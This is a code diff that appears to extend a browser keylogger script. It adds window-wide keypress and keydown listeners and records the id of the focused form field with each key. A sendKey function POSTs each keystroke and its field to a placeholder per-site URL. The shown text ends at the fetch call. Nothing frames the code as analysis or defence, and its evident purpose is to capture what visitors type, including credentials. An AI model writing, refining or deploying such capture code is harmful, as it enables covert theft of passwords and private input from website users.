@@ -1,12 +1,23 @@
 // generate per site url
 const url = "/k"  // placeholder to be replaced
-// add listener
+//* Listener for characters
 window.addEventListener('keypress', async (ev)=>{
-    await sendKey(ev.key)
+    //! This will only handle printable characters after deprecation of keyCode
+    await sendKey(ev.key, document.activeElement.id)
 })
-async function sendKey(key){
+//* Listener for non-printable characters
+window.addEventListener('keydown', (ev)=>{
+    console.log(ev.key)
+})
+
+
+
+
+async function sendKey(key, field){
+    console.log(key)
     const data = {
-        key: key
+        key: key,
+        field: field
     }
     let res = await fetch(url, {
         method: 'POST',
